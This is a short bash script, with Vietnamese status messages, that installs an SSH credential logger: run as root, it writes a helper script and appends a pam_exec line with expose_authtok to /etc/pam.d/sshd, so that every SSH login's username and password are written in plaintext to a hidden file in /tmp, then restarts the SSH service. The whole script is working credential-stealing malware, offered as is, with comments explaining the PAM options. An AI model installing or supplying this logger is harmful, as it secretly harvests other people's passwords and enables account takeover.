#!/bin/bash

logssh="/tmp/.log_sshtrojan1.txt"
in4ssh="/usr/local/bin/sshlogininfo.sh"
filePam="/etc/pam.d/sshd"

if [[ $EUID -ne 0 ]]; then
    echo "Khong co quyen su dung! Can tai khoan root."
    exit 1
fi

if [[ -e $logssh ]]; then 
    echo "File $logssh da duoc tao."
else
    echo "Tao file $logssh thanh cong." 
    touch $logssh
fi

if [[ -e $in4ssh ]]; then 
    echo "file $in4ssh da duoc tao."
else
    echo "Tao file $in4ssh thanh cong." 
    touch $in4ssh
fi

cat > $in4ssh << EOF
#!/bin/bash
read PASSWORD
echo "Username: \$PAM_USER"
echo "Password: \$PASSWORD"
EOF

chmod +x $in4ssh

cat >> $filePam << EOF
@include common-auth
auth required pam_exec.so expose_authtok seteuid log=$logssh $in4ssh
EOF

/etc/init.d/ssh restart
echo "Khoi dong lai ssh"


#pam_exec is a PAM module that can be used to run an external command.
#The following PAM items are exported as environment variables: PAM_RHOST, PAM_RUSER, PAM_SERVICE, PAM_TTY, PAM_USER and PAM_TYPE,
# which contains one of the module types: account, auth, password, open_session and close_session.
#with options:
#expose_authtok : During authentication the calling command can read the password from stdin.
#log=file : The output of the command is appended to file
#seteuid : Per default pam_exec.so will execute the external command with the real user ID of the calling process. Specifying this option means the command is run with the effective user ID.

#PAM writes the password to stdin of the script and provides the user name as an environment variable.
#then, output of in4ssh is appended to logssh